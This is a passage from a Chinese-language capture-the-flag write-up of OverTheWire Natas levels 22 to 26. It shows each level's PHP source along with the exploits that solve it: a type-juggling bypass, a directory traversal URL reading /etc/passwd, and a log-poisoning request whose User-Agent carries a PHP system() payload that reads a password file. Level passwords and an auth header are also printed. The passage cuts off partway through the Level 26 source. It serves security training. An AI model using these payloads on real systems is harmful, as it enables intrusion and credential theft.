    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">array_key_exists</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"revelio"</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">print</span> <span class="token string double-quoted-string">"You are an admin. The credentials for the next level are:&lt;br>"</span><span class="token punctuation">;</span>
    <span class="token keyword">print</span> <span class="token string double-quoted-string">"&lt;pre>Username: natas23\n"</span><span class="token punctuation">;</span>
    <span class="token keyword">print</span> <span class="token string double-quoted-string">"Password: &lt;censored>&lt;/pre>"</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token delimiter important">?></span></span></code></pre>

<p>很简洁，看wp说是漏洞点在<code>header(&quot;Location: /&quot;);</code></p>
<p>发起重定向的时候因为没有exit所以后续代码依然执行</p>
<p><img src="https://tuchuang-1322890938.cos.ap-shanghai.myqcloud.com/pictures/image-20250814152833570.png" alt="image-20250814152833570" loading="lazy"></p>
<pre class="language-none"><code class="language-none">Username: natas23
Password: dIUQcI3uSus1JEOSSWRAEXBG8KbR8tRs</code></pre>

<h2 id="Level-23"><a href="#Level-23" class="headerlink" title="Level 23"></a>Level 23</h2><p><img src="https://tuchuang-1322890938.cos.ap-shanghai.myqcloud.com/pictures/image-20250814152909123.png" alt="image-20250814152909123" loading="lazy"></p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">array_key_exists</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"passwd"</span><span class="token punctuation">,</span><span class="token variable">$_REQUEST</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strstr</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"passwd"</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"iloveyou"</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"passwd"</span><span class="token punctuation">]</span> <span class="token operator">></span> <span class="token number">10</span> <span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;br>The credentials for the next level are:&lt;br>"</span><span class="token punctuation">;</span>
            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;pre>Username: natas24 Password: &lt;censored>&lt;/pre>"</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token keyword">else</span><span class="token punctuation">&#123;</span>
            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;br>Wrong!&lt;br>"</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token comment">// morla / 10111</span>
<span class="token delimiter important">?></span></span> </code></pre>

<p><code>strstr</code>查找字符串第一次出现的位置直到末尾，所以第一部分很容易满足，第二部分值大于10，若比较，传个大于10数字开头即可</p>
<pre class="language-none"><code class="language-none">11iloveyou</code></pre>

<p><img src="https://tuchuang-1322890938.cos.ap-shanghai.myqcloud.com/pictures/image-20250814153836230.png" alt="image-20250814153836230" loading="lazy"></p>
<pre class="language-none"><code class="language-none">Username: natas24 Password: MeuqmfJ8DDKuTr5pcvzFKSwlxedZYEWd</code></pre>

<h2 id="Level-24"><a href="#Level-24" class="headerlink" title="Level 24"></a>Level 24</h2><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">array_key_exists</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"passwd"</span><span class="token punctuation">,</span><span class="token variable">$_REQUEST</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">strcmp</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"passwd"</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"&lt;censored>"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;br>The credentials for the next level are:&lt;br>"</span><span class="token punctuation">;</span>
            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;pre>Username: natas25 Password: &lt;censored>&lt;/pre>"</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token keyword">else</span><span class="token punctuation">&#123;</span>
            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;br>Wrong!&lt;br>"</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token comment">// morla / 10111</span>
<span class="token delimiter important">?></span></span>  </code></pre>

<p>依然是弱类型比较，传个数组即可</p>
<pre class="language-none"><code class="language-none">http:&#x2F;&#x2F;natas24.natas.labs.overthewire.org&#x2F;?passwd[]&#x3D;1</code></pre>

<pre class="language-none"><code class="language-none">Username: natas25 Password: ckELKUWZUfpOv6uxS6M7lXBpBssJZ4Ws</code></pre>

<h2 id="Level-25"><a href="#Level-25" class="headerlink" title="Level 25"></a>Level 25</h2><p><img src="https://tuchuang-1322890938.cos.ap-shanghai.myqcloud.com/pictures/image-20250814154114625.png" alt="image-20250814154114625" loading="lazy"></p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
    <span class="token comment">// cheers and &lt;3 to malvina</span>
    <span class="token comment">// - morla</span>

    <span class="token keyword">function</span> <span class="token function-definition function">setLanguage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token comment">/* language setup */</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">array_key_exists</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"lang"</span><span class="token punctuation">,</span><span class="token variable">$_REQUEST</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">safeinclude</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"language/"</span> <span class="token operator">.</span> <span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"lang"</span><span class="token punctuation">]</span> <span class="token punctuation">)</span><span class="token punctuation">)</span>
                <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span>
        <span class="token function">safeinclude</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"language/en"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
    <span class="token punctuation">&#125;</span>
    
    <span class="token keyword">function</span> <span class="token function-definition function">safeinclude</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token comment">// check for directory traversal</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strstr</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"../"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
            <span class="token function">logRequest</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Directory traversal attempt! fixing request."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token variable">$filename</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"../"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">""</span><span class="token punctuation">,</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token comment">// dont let ppl steal our passwords</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strstr</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"natas_webpass"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
            <span class="token function">logRequest</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Illegal file access detected! Aborting!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token comment">// add more checks...</span>

        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> 
            <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    
    <span class="token keyword">function</span> <span class="token function-definition function">listFiles</span><span class="token punctuation">(</span><span class="token variable">$path</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token variable">$listoffiles</span><span class="token operator">=</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$handle</span> <span class="token operator">=</span> <span class="token function">opendir</span><span class="token punctuation">(</span><span class="token variable">$path</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
            <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token constant boolean">false</span> <span class="token operator">!==</span> <span class="token punctuation">(</span><span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">readdir</span><span class="token punctuation">(</span><span class="token variable">$handle</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$file</span> <span class="token operator">!=</span> <span class="token string double-quoted-string">"."</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$file</span> <span class="token operator">!=</span> <span class="token string double-quoted-string">".."</span><span class="token punctuation">)</span>
                    <span class="token variable">$listoffiles</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token variable">$file</span><span class="token punctuation">;</span>
        
        <span class="token function">closedir</span><span class="token punctuation">(</span><span class="token variable">$handle</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token variable">$listoffiles</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span> 
    
    <span class="token keyword">function</span> <span class="token function-definition function">logRequest</span><span class="token punctuation">(</span><span class="token variable">$message</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token variable">$log</span><span class="token operator">=</span><span class="token string double-quoted-string">"["</span><span class="token operator">.</span> <span class="token function">date</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"d.m.Y H::i:s"</span><span class="token punctuation">,</span><span class="token function">time</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">.</span><span class="token string double-quoted-string">"]"</span><span class="token punctuation">;</span>
        <span class="token variable">$log</span><span class="token operator">=</span><span class="token variable">$log</span> <span class="token operator">.</span> <span class="token string double-quoted-string">" "</span> <span class="token operator">.</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'HTTP_USER_AGENT'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token variable">$log</span><span class="token operator">=</span><span class="token variable">$log</span> <span class="token operator">.</span> <span class="token string double-quoted-string">" \""</span> <span class="token operator">.</span> <span class="token variable">$message</span> <span class="token operator">.</span><span class="token string double-quoted-string">"\"\n"</span><span class="token punctuation">;</span> 
        <span class="token variable">$fd</span><span class="token operator">=</span><span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/var/www/natas/natas25/logs/natas25_"</span> <span class="token operator">.</span> <span class="token function">session_id</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">.</span><span class="token string double-quoted-string">".log"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"a"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">fwrite</span><span class="token punctuation">(</span><span class="token variable">$fd</span><span class="token punctuation">,</span><span class="token variable">$log</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">fclose</span><span class="token punctuation">(</span><span class="token variable">$fd</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token delimiter important">?></span></span>

<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span><span class="token punctuation">></span></span>natas25<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>content<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">align</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>right<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>select</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">'</span>lang<span class="token punctuation">'</span></span> <span class="token special-attr"><span class="token attr-name">onchange</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">'</span><span class="token value javascript language-javascript"><span class="token keyword">this</span><span class="token punctuation">.</span>form<span class="token punctuation">.</span><span class="token function">submit</span><span class="token punctuation">(</span><span class="token punctuation">)</span></span><span class="token punctuation">'</span></span></span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>option</span><span class="token punctuation">></span></span>language<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>option</span><span class="token punctuation">></span></span>
<span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token function">listFiles</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"language/"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> <span class="token variable">$f</span><span class="token punctuation">)</span> <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;option><span class="token interpolation"><span class="token variable">$f</span></span>&lt;/option>"</span><span class="token punctuation">;</span> <span class="token delimiter important">?></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>select</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>

<span class="token php language-php"><span class="token delimiter important">&lt;?php</span>  
    <span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">setLanguage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    
    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;h2><span class="token interpolation"><span class="token variable">$__GREETING</span></span>&lt;/h2>"</span><span class="token punctuation">;</span>
    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;p align=\"justify\"><span class="token interpolation"><span class="token variable">$__MSG</span></span>"</span><span class="token punctuation">;</span>
    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;div align=\"right\">&lt;h6><span class="token interpolation"><span class="token variable">$__FOOTER</span></span>&lt;/h6>&lt;div>"</span><span class="token punctuation">;</span>
<span class="token delimiter important">?></span></span></code></pre>

<p>目录遍历，可以双写绕过下面这个部分</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token variable">$filename</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"../"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">""</span><span class="token punctuation">,</span><span class="token variable">$filename</span><span class="token punctuation">)</span></code></pre>

<pre class="language-none"><code class="language-none">http:&#x2F;&#x2F;natas25.natas.labs.overthewire.org&#x2F;?lang&#x3D;....&#x2F;&#x2F;....&#x2F;&#x2F;....&#x2F;&#x2F;....&#x2F;&#x2F;....&#x2F;&#x2F;etc&#x2F;passwd</code></pre>

<p><img src="https://tuchuang-1322890938.cos.ap-shanghai.myqcloud.com/pictures/image-20250814154719420.png" alt="image-20250814154719420" loading="lazy"></p>
<p>但是读密码被限制了</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strstr</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"natas_webpass"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
           <span class="token function">logRequest</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Illegal file access detected! Aborting!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
           <span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
       <span class="token punctuation">&#125;</span></code></pre>

<p>需要用到这个函数</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">function</span> <span class="token function-definition function">logRequest</span><span class="token punctuation">(</span><span class="token variable">$message</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
       <span class="token variable">$log</span><span class="token operator">=</span><span class="token string double-quoted-string">"["</span><span class="token operator">.</span> <span class="token function">date</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"d.m.Y H::i:s"</span><span class="token punctuation">,</span><span class="token function">time</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">.</span><span class="token string double-quoted-string">"]"</span><span class="token punctuation">;</span>
       <span class="token variable">$log</span><span class="token operator">=</span><span class="token variable">$log</span> <span class="token operator">.</span> <span class="token string double-quoted-string">" "</span> <span class="token operator">.</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'HTTP_USER_AGENT'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
       <span class="token variable">$log</span><span class="token operator">=</span><span class="token variable">$log</span> <span class="token operator">.</span> <span class="token string double-quoted-string">" \""</span> <span class="token operator">.</span> <span class="token variable">$message</span> <span class="token operator">.</span><span class="token string double-quoted-string">"\"\n"</span><span class="token punctuation">;</span> 
       <span class="token variable">$fd</span><span class="token operator">=</span><span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/var/www/natas/natas25/logs/natas25_"</span> <span class="token operator">.</span> <span class="token function">session_id</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">.</span><span class="token string double-quoted-string">".log"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"a"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
       <span class="token function">fwrite</span><span class="token punctuation">(</span><span class="token variable">$fd</span><span class="token punctuation">,</span><span class="token variable">$log</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
       <span class="token function">fclose</span><span class="token punctuation">(</span><span class="token variable">$fd</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
   <span class="token punctuation">&#125;</span></code></pre>

<p>记录请求信息到日志文件,用sessionid命名的，可以打日志包含</p>
<p><img src="https://tuchuang-1322890938.cos.ap-shanghai.myqcloud.com/pictures/image-20250814155043525.png" alt="image-20250814155043525" loading="lazy"></p>
<p>记录的UA头</p>
<p><img src="https://tuchuang-1322890938.cos.ap-shanghai.myqcloud.com/pictures/image-20250814155406142.png" alt="image-20250814155406142" loading="lazy"></p>
<pre class="language-none"><code class="language-none">GET &#x2F;?lang&#x3D;....&#x2F;&#x2F;....&#x2F;&#x2F;....&#x2F;&#x2F;....&#x2F;&#x2F;....&#x2F;&#x2F;etc&#x2F;passwd HTTP&#x2F;1.1
Host: natas25.natas.labs.overthewire.org
User-Agent: &lt;?php system(&quot;cat &#x2F;etc&#x2F;natas_webpass&#x2F;natas26&quot;); ?&gt;
Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,*&#x2F;*;q&#x3D;0.8
Accept-Language: zh-CN,zh;q&#x3D;0.8,zh-TW;q&#x3D;0.7,zh-HK;q&#x3D;0.5,en-US;q&#x3D;0.3,en;q&#x3D;0.2
Accept-Encoding: gzip, deflate, br
Authorization: Basic bmF0YXMyNTpja0VMS1VXWlVmcE92NnV4UzZNN2xYQnBCc3NKWjRXcw&#x3D;&#x3D;
Connection: keep-alive
Cookie: PHPSESSID&#x3D;hkiikbq76h83ae36c21ks75v5p
Upgrade-Insecure-Requests: 1
Priority: u&#x3D;0, i

</code></pre>



<p><img src="https://tuchuang-1322890938.cos.ap-shanghai.myqcloud.com/pictures/image-20250814155434163.png" alt="image-20250814155434163" loading="lazy"></p>
<pre class="language-none"><code class="language-none">cVXXwxMS3Y26n5UZU89QgpGmWCelaQlE</code></pre>

<h2 id="Level-26"><a href="#Level-26" class="headerlink" title="Level 26"></a>Level 26</h2><p><img src="https://tuchuang-1322890938.cos.ap-shanghai.myqcloud.com/pictures/image-20250814155521640.png" alt="image-20250814155521640" loading="lazy"></p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
    <span class="token comment">// sry, this is ugly as hell.</span>
    <span class="token comment">// cheers kaliman ;)</span>
    <span class="token comment">// - morla</span>

    <span class="token keyword">class</span> <span class="token class-name-definition class-name">Logger</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">private</span> <span class="token variable">$logFile</span><span class="token punctuation">;</span>
        <span class="token keyword">private</span> <span class="token variable">$initMsg</span><span class="token punctuation">;</span>
        <span class="token keyword">private</span> <span class="token variable">$exitMsg</span><span class="token punctuation">;</span>

        <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
            <span class="token comment">// initialise variables</span>
            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">initMsg</span><span class="token operator">=</span><span class="token string double-quoted-string">"#--session started--#\n"</span><span class="token punctuation">;</span>
            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">exitMsg</span><span class="token operator">=</span><span class="token string double-quoted-string">"#--session end--#\n"</span><span class="token punctuation">;</span>
            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">logFile</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"/tmp/natas26_"</span> <span class="token operator">.</span> <span class="token variable">$file</span> <span class="token operator">.</span> <span class="token string double-quoted-string">".log"</span><span class="token punctuation">;</span>

            <span class="token comment">// write initial message</span>
            <span class="token variable">$fd</span><span class="token operator">=</span><span class="token function">fopen</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">logFile</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"a+"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token function">fwrite</span><span class="token punctuation">(</span><span class="token variable">$fd</span><span class="token punctuation">,</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">initMsg</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token function">fclose</span><span class="token punctuation">(</span><span class="token variable">$fd</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>

        <span class="token keyword">function</span> <span class="token function-definition function">log</span><span class="token punctuation">(</span><span class="token variable">$msg</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
            <span class="token variable">$fd</span><span class="token operator">=</span><span class="token function">fopen</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">logFile</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"a+"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token function">fwrite</span><span class="token punctuation">(</span><span class="token variable">$fd</span><span class="token punctuation">,</span><span class="token variable">$msg</span><span class="token operator">.</span><span class="token string double-quoted-string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token function">fclose</span><span class="token punctuation">(</span><span class="token variable">$fd</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>

        <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
            <span class="token comment">// write exit message</span>
            <span class="token variable">$fd</span><span class="token operator">=</span><span class="token function">fopen</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">logFile</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"a+"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token function">fwrite</span><span class="token punctuation">(</span><span class="token variable">$fd</span><span class="token punctuation">,</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">exitMsg</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token function">fclose</span><span class="token punctuation">(</span><span class="token variable">$fd</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">function</span> <span class="token function-definition function">showImage</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;img src=\"<span class="token interpolation"><span class="token variable">$filename</span></span>\">"</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">function</span> <span class="token function-definition function">drawImage</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token variable">$img</span><span class="token operator">=</span><span class="token function">imagecreatetruecolor</span><span class="token punctuation">(</span><span class="token number">400</span><span class="token punctuation">,</span><span class="token number">300</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">drawFromUserdata</span><span class="token punctuation">(</span><span class="token variable">$img</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">imagepng</span><span class="token punctuation">(</span><span class="token variable">$img</span><span class="token punctuation">,</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">imagedestroy</span><span class="token punctuation">(</span><span class="token variable">$img</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">function</span> <span class="token function-definition function">drawFromUserdata</span><span class="token punctuation">(</span><span class="token variable">$img</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token function">array_key_exists</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"x1"</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">array_key_exists</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"y1"</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span>
            <span class="token function">array_key_exists</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"x2"</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">array_key_exists</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"y2"</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>

            <span class="token variable">$color</span><span class="token operator">=</span><span class="token function">imagecolorallocate</span><span class="token punctuation">(</span><span class="token variable">$img</span><span class="token punctuation">,</span><span class="token number">0xff</span><span class="token punctuation">,</span><span class="token number">0x12</span><span class="token punctuation">,</span><span class="token number">0x1c</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token function">imageline</span><span class="token punctuation">(</span><span class="token variable">$img</span><span class="token punctuation">,</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"x1"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"y1"</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
